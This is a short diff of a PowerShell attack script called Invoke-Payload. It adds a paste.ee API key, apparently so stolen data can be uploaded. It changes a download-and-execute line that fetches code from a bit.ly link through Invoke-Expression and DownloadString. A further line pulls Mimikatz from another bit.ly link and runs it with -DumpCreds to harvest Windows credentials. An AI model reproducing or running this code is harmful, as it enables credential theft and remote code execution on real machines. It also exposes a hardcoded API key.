@@ -2,7 +2,7 @@ function Invoke-Payload {
 param (
 	################################################
 	##          API Key from paste.ee             ##
-	  $api_key = ''
+	  $api_key = 'aXCZPOXodPAlwPVmvm5WNsPDocJ8TJjrw0kWMH1uE'
 	################################################
 	)
 	
@@ -11,7 +11,7 @@ param (
 	
 	$Command = "
 	# Import Paste.ee API module
-	Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2bNdwqV')
+	Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2A6R03X')
 	# Import Mimikatz module
 	Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/1N83FXO')
 	`$Creds = Invoke-Mimikatz -DumpCreds
